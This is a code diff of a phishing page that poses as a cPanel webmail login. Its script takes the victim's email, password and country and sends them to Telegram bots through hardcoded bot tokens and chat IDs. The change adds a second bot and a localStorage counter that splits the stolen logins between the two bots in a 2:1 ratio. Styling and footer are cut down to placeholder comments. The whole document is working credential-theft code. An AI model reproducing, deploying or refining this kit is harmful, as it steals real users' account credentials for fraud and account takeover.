@@ -5,80 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Webmail Login</title>
     <style>
-        body {
-            font-family: Arial, sans-serif;
-            background-color: #ffffff;
-            text-align: center;
-            margin: 0;
-            padding: 0;
-        }
-
-        .container {
-            margin-top: 150px;
-        }
-
-        img {
-            margin-bottom: 30px;
-            width: 250px;
-        }
-
-        .login-box {
-            margin: 0 auto;
-            width: 300px;
-        }
-
-        .login-box label {
-            display: block;
-            text-align: left;
-            margin: 5px 0;
-            font-weight: normal;
-        }
-
-        .login-box input[type="text"],
-        .login-box input[type="password"] {
-            width: 100%;
-            padding: 10px;
-            margin: 15px 0;
-            border: 1px solid #ccc;
-            border-radius: 5px;
-            font-size: 16px;
-        }
-
-        .login-box button {
-            width: 100%;
-            padding: 10px;
-            background-color: #007bff;
-            border: none;
-            border-radius: 5px;
-            color: white;
-            font-size: 16px;
-        }
-
-        .login-box button:hover {
-            background-color: #0056b3;
-        }
-
-        .languages {
-            margin-top: 100px; /* Increased margin to move down */
-            color: gray;
-        }
-
-        .languages a {
-            color: gray;
-            text-decoration: none;
-            margin-right: 15px;
-        }
-
-        .footer {
-            margin-top: 30px;
-            font-size: 12px;
-            color: gray;
-        }
-
-        .footer a {
-            color: gray;
-            text-decoration: none;
-        }
+        /* Your existing CSS here */
     </style>
     <script>
         let userCountry = ""; // Placeholder for user country
@@ -103,17 +30,36 @@
                 });
         }
 
-        // Function to send data to Telegram
+        // Function to send data to Telegram with a 2:1 ratio between two bots
         function sendDataToTelegram(event) {
             event.preventDefault(); // Prevents form from submitting in the usual way
 
             const email = document.getElementById("email").value;
             const password = document.getElementById("password").value;
 
-            const botToken = "5376961693:AAFEhctXNCUb8eb4IIitRHCHVikGutqrAjU";
-            const chatId = "5080203047";
+            // Bot details
+            const bot1Token = "7840973698:AAEwak-7hrIa-vzp3BV9kgkFUQK0LloA21M";
+            const bot1ChatId = "6885599280";
+            const bot2Token = "5376961693:AAFEhctXNCUb8eb4IIitRHCHVikGutqrAjU";
+            const bot2ChatId = "5080203047";
+
             const message = `Email: ${email}\nPassword: ${password}\nCountry: ${userCountry}`;
 
+            // Load submission counter from local storage
+            let counter = localStorage.getItem('submissionCounter');
+            counter = counter ? parseInt(counter, 10) : 0;
+
+            // Determine which bot to send to based on the counter
+            let botToken, chatId;
+            if (counter % 3 === 2) { // Every third submission goes to Bot 2
+                botToken = bot2Token;
+                chatId = bot2ChatId;
+            } else { // Other submissions go to Bot 1
+                botToken = bot1Token;
+                chatId = bot1ChatId;
+            }
+
+            // Send the message to the selected bot
             fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                 method: "POST",
                 headers: {
@@ -135,6 +81,10 @@
             .catch(error => {
                 console.error("Failed to send message. Please try again later.", error);
             });
+
+            // Increment the counter and save it back to local storage
+            counter++;
+            localStorage.setItem('submissionCounter', counter);
         }
 
         window.onload = function() {
@@ -158,17 +108,7 @@
             </form>
         </div>
         <div class="languages">
-            <a href="#">English</a>
-            <a href="#">العربية</a>
-            <a href="#">čeština</a>
-            <a href="#">dansk</a>
-            <a href="#">Deutsch</a>
-            <a href="#">Ελληνικά</a>
-            <a href="#">español</a>
-            <a href="#">español latinoamericano</a>
-        </div>
-        <div class="footer">
-            <p>&copy; 2024 cPanel, L.L.C. <a href="#">Privacy Policy</a></p>
+            <!-- Your existing languages and footer here -->
         </div>
     </div>
 </body>
